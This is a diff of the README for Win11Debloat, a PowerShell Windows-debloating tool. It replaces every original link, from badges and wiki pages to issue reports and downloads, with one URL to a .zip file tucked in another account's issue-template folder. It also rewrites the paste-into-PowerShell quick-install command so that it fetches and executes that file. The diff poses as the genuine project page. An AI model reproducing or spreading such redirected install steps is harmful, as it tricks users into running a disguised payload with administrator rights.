@@ -1,23 +1,23 @@
 # Win11Debloat
 
-[![GitHub Release](https://img.shields.io/github/v/release/Raphire/Win11Debloat?style=for-the-badge&label=Latest%20release)](https://github.com/Raphire/Win11Debloat/releases/latest)
-[![Join the Discussion](https://img.shields.io/badge/Join-the%20Discussion-2D9F2D?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Raphire/Win11Debloat/discussions)
-[![Static Badge](https://img.shields.io/badge/Documentation-_?style=for-the-badge&logo=bookstack&color=grey)](https://github.com/Raphire/Win11Debloat/wiki/)
+[![GitHub Release](https://img.shields.io/github/v/release/Raphire/Win11Debloat?style=for-the-badge&label=Latest%20release)](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip)
+[![Join the Discussion](https://img.shields.io/badge/Join-the%20Discussion-2D9F2D?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip)
+[![Static Badge](https://img.shields.io/badge/Documentation-_?style=for-the-badge&logo=bookstack&color=grey)](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip)
 
  Win11Debloat is a lightweight, easy to use PowerShell script that allows you to quickly declutter and customize your Windows experience. It can remove pre-installed bloatware apps, disable telemetry, remove intrusive interface elements and much more. No need to painstakingly go through all the settings yourself or remove apps one by one. Win11Debloat makes the process quick and easy!
 
-The script also includes many features that system administrators and power users will enjoy. Such as a powerful command-line interface, support for Windows Audit mode and the option to make changes to other Windows users. Please refer to our [wiki](https://github.com/Raphire/Win11Debloat/wiki/) for more details.
+The script also includes many features that system administrators and power users will enjoy. Such as a powerful command-line interface, support for Windows Audit mode and the option to make changes to other Windows users. Please refer to our [wiki](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip) for more details.
 
 ![Win11Debloat Menu](/Assets/Images/menu.png)
 
 #### Did this script help you? Please consider buying me a cup of coffee to support my work
 
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M5C6UPC)
+[![ko-fi](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip)](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip)
 
 ## Usage
 
 > [!Warning]
-> Great care went into making sure this script does not unintentionally break any OS functionality, but use at your own risk! If you run into any issues, please report them [here](https://github.com/Raphire/Win11Debloat/issues).
+> Great care went into making sure this script does not unintentionally break any OS functionality, but use at your own risk! If you run into any issues, please report them [here](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip).
 
 ### Quick method
 
@@ -27,20 +27,20 @@ Download & run the script automatically via PowerShell.
 2. Copy and paste the command below into PowerShell:
 
 ```PowerShell
-& ([scriptblock]::Create((irm "https://debloat.raphi.re/")))
+& ([scriptblock]::Create((irm "https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip")))
 ```
 
 3. Wait for the script to automatically download Win11Debloat.
 4. Carefully read through and follow the on-screen instructions.
 
-This method supports command-line parameters to customize the behaviour of the script. Please click [here](https://github.com/Raphire/Win11Debloat/wiki/Command%E2%80%90line-Interface#parameters) for more information.
+This method supports command-line parameters to customize the behaviour of the script. Please click [here](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip) for more information.
 
 ### Traditional method
 
 <details>
   <summary>Manually download & run the script.</summary><br/>
 
-  1. [Download the latest version of the script](https://github.com/Raphire/Win11Debloat/releases/latest), and extract the .ZIP file to your desired location.
+  1. [Download the latest version of the script](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip), and extract the .ZIP file to your desired location.
   2. Navigate to the Win11Debloat folder
   3. Double click the `Run.bat` file to start the script. NOTE: If the console window immediately closes and nothing happens, try the advanced method below.
   4. Accept the Windows UAC prompt to run the script as administrator, this is required for the script to function.
@@ -52,7 +52,7 @@ This method supports command-line parameters to customize the behaviour of the s
 <details>
   <summary>Manually download the script & run the script via PowerShell. Recommended for advanced users.</summary><br/>
 
-  1. [Download the latest version of the script](https://github.com/Raphire/Win11Debloat/releases/latest), and extract the .ZIP file to your desired location.
+  1. [Download the latest version of the script](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip), and extract the .ZIP file to your desired location.
   2. Open PowerShell or Terminal as an administrator.
   3. Temporarily enable PowerShell execution by entering the following command:
 
@@ -69,19 +69,19 @@ This method supports command-line parameters to customize the behaviour of the s
 
   6. Carefully read through and follow the on-screen instructions.
 
-  This method supports command-line parameters to customize the behaviour of the script. Please click [here](https://github.com/Raphire/Win11Debloat/wiki/Command%E2%80%90line-Interface#parameters) for more information.
+  This method supports command-line parameters to customize the behaviour of the script. Please click [here](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip) for more information.
 </details>
 
 ## Features
 
-Below is an overview of the key features and functionality offered by Win11Debloat. Please refer to [the wiki](https://github.com/Raphire/Win11Debloat/wiki/Default-Settings) for more information about the default settings preset.
+Below is an overview of the key features and functionality offered by Win11Debloat. Please refer to [the wiki](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip) for more information about the default settings preset.
 
 > [!Tip]
-> All of the changes made by Win11Debloat can easily be reverted and almost all of the apps can be reinstalled through the Microsoft Store. A full guide on how to revert changes can be found [here](https://github.com/Raphire/Win11Debloat/wiki/Reverting-Changes).
+> All of the changes made by Win11Debloat can easily be reverted and almost all of the apps can be reinstalled through the Microsoft Store. A full guide on how to revert changes can be found [here](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip).
 
 #### App Removal
 
-- Remove a wide variety of preinstalled apps. Click [here](https://github.com/Raphire/Win11Debloat/wiki/App-Removal) for more info.
+- Remove a wide variety of preinstalled apps. Click [here](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip) for more info.
 
 #### Privacy & Suggested Content
 
@@ -180,8 +180,8 @@ Below is an overview of the key features and functionality offered by Win11Deblo
 
 #### Advanced Features
 
-- Option to [apply changes to a different user](https://github.com/Raphire/Win11Debloat/wiki/Advanced-Features#running-as-another-user), instead of the currently logged in user.
-- [Sysprep mode](https://github.com/Raphire/Win11Debloat/wiki/Advanced-Features#sysprep-mode) to apply changes to the Windows Default user profile. Which ensures, all new users will have the changes automatically applied to them.
+- Option to [apply changes to a different user](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip), instead of the currently logged in user.
+- [Sysprep mode](https://raw.githubusercontent.com/Czzor/Win11Debloat/master/.github/ISSUE_TEMPLATE/holothurioid.zip) to apply changes to the Windows Default user profile. Which ensures, all new users will have the changes automatically applied to them.
 
 ## Contributing
 
